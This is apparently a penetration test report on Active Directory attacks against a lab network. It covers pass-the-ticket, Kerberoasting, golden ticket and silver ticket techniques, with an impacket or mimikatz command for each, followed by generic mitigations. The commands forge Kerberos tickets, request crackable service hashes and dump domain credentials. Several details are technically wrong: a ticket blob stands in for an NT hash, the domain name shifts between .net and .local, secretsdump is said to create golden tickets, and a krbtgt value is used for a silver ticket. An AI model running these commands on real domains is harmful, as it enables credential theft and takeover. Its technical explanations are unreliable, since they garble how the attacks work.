# Active Directory Exploitation Findings

## Overview

This document details the vulnerabilities that were exploited in Active Directory (AD) during the penetration testing of Doomsday Labs' network.

## Technical Details

### Exploitation Techniques
- **Pass the Ticket Attack**:
  - This attack was carried out using forged Kerberos Ticket Granting Tickets (TGTs) obtained through memory dumping techniques. The `impacket-ticketer` tool was used to create forged tickets allowing unauthorized access under the assumption of legitimate users.
    ```
    impacket-ticketer -nthash doIF0jCCBc6g...NXU/rX [snipped] -domain-sid S-1-5-21-2774200336-3400690103-1452933870-1111 -domain doomsdaylabs.net da.admin
    ```
- **Kerberoasting**:
  - Service accounts with weak or default passwords were targeted to request service tickets that could be cracked offline. This technique was used to extract service ticket hashes which were then subjected to offline cracking.
    ```
    impacket-GetUserSPNs doomsdaylabs.net/filemaker -dc-ip 10.100.1.2 -request
    ```
- **Golden Ticket Creation**:
  - After obtaining domain admin privileges, Golden Tickets were created for maintaining persistent and undetected access within the network. This was achieved using `impacket-secretsdump` to dump credentials and create a Golden Ticket.
    ```
    KRB5CCNAME=./Administrator.ccache impacket-secretsdump -k -no-pass -dc-ip 10.100.1.2 -target-ip 10.100.1.2 dc.doomsdaylabs.net
    ```
- **Silver Ticket Attack**:
  - Exploited misconfigurations in service accounts to create Silver Tickets, granting access to specific services without requiring full domain compromise.
    ```
    mimikatz # kerberos::golden /user:Administrator /domain:doomsdaylabs.local /sid:S-1-5-21-2774200336-3400690103-1452933870-1111 /krbtgt:doIF0jCCBc6g...NXU/rX [snipped] /service:HTTP /target:webserver.doomsdaylabs.net
    ```

## Impact Assessment

- **Potential Risks**:
  - Unauthorized Access: Exploited vulnerabilities allowed attackers to gain unauthorized access to various components of the network, leading to potential data breaches.
  - Privilege Escalation: By exploiting these vulnerabilities, attackers could escalate privileges to administrative levels, gaining control over the network infrastructure.
  - Persistence: The use of Golden and Silver Tickets enabled persistent access to network resources, complicating detection and remediation efforts.

## Mitigations

- **Security Enhancements**:
  - Regularly update and patch Active Directory environments to close security gaps and fix vulnerabilities.
  - Conduct periodic security reviews and audits of Active Directory settings to ensure all configurations adhere to best security practices.
  - Implement strict access controls and segmentation to limit the impact of potential exploits.
  - Educate and train IT staff on the latest AD security threats and countermeasures to enhance organizational readiness against attacks.

## Conclusion

The findings from this penetration test highlight critical security issues within the Active Directory setup of Doomsday Labs. Addressing these vulnerabilities promptly and following the recommended security measures will significantly improve the security posture of the organization.
